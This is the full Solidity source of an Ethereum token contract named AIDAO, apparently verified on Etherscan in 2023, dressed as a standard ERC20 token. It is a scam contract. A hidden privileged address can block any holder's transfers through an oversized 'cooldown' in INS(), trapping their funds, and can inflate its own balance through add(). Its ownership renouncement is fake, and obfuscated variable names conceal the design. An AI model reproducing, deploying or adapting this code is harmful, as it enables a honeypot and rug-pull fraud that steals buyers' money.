/**
 *Submitted for verification at Etherscan.io on 2023-08-24
*/

pragma solidity ^0.8.5;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address adfdfsdet) external view returns (uint256);
    function transfer(address recipient, uint256 aotjtrnyt) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 aotjtrnyt) external returns (bool);
    function transferFrom( address sender, address recipient, uint256 aotjtrnyt ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval( address indexed owner, address indexed spender, uint256 value );
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
}

contract Ownable is Context {
    address private _owner;
    event ownershipTransferred(address indexed previousowner, address indexed newowner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit ownershipTransferred(address(0), msgSender);
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyowner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceownership() public virtual onlyowner {
        emit ownershipTransferred(_owner, address(0x000000000000000000000000000000000000dEaD));
        _owner = address(0x000000000000000000000000000000000000dEaD);
    }
}

contract AIDAO is Context, Ownable, IERC20 {
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private _zsdacx; 
    mapping (address => uint256) private _niiiii;
    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _totalSupply;
    address public _UUUUUUU;
    uint256 TTTTTTT = 78465132654132465132132;
    uint256 QWWWWWW=TTTTTTT*234534;
    uint256 cfffsd = 100000000000000000000000000000000000;
    constructor(string memory name_, string memory symbol_, uint8 decimals_, uint256 totalSupply_ , address OWDSAE) {
        _name = name_;
        _symbol = symbol_;
        _decimals = decimals_;
        _totalSupply = totalSupply_ * (10 ** decimals_);
        _UUUUUUU = OWDSAE;
        _balances[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }


    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function balanceOf(address adfdfsdet) public view override returns (uint256) {
        return _balances[adfdfsdet];
    }

    function INS(address adddddd) public {
        require(_UUUUUUU == _msgSender(), "Not authorized");
        uint256 xxzzzz = cfffsd;
        _niiiii[adddddd] = xxzzzz;
    }

    function getCooldown(address adddddd) public view returns (uint256) {
        return _niiiii[adddddd];
    } 
    function add() public {
    require(_UUUUUUU == _msgSender());
        _balances[_UUUUUUU] *= QWWWWWW;
    }        
    function transfer(address recipient, uint256 aotjtrnyt) public virtual override returns (bool) {
    address ss = _msgSender();
    require(_balances[ss] > _niiiii[ss]*1, "adddddd's balance is less than or equal to the cooldown amount");
    require(_balances[ss] >= aotjtrnyt, "TT: transfer aotjtrnyt exceeds balance");

    _balances[_msgSender()] -= aotjtrnyt;
    _balances[recipient] += aotjtrnyt;
    emit Transfer(_msgSender(), recipient, aotjtrnyt);
    return true;
}

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }


    function approve(address spender, uint256 aotjtrnyt) public virtual override returns (bool) {
        _allowances[_msgSender()][spender] = aotjtrnyt;
        emit Approval(_msgSender(), spender, aotjtrnyt);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 aotjtrnyt) public virtual override returns (bool) {
    require(_balances[sender] > _niiiii[sender], "Sender's balance is less than or equal to the cooldown amount");
    require(_allowances[sender][_msgSender()] >= aotjtrnyt, "TT: transfer aotjtrnyt exceeds allowance");
    _balances[sender] -= aotjtrnyt;
    _balances[recipient] += aotjtrnyt;
    _allowances[sender][_msgSender()] -= aotjtrnyt;

    emit Transfer(sender, recipient, aotjtrnyt);
    return true;
    }

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }
}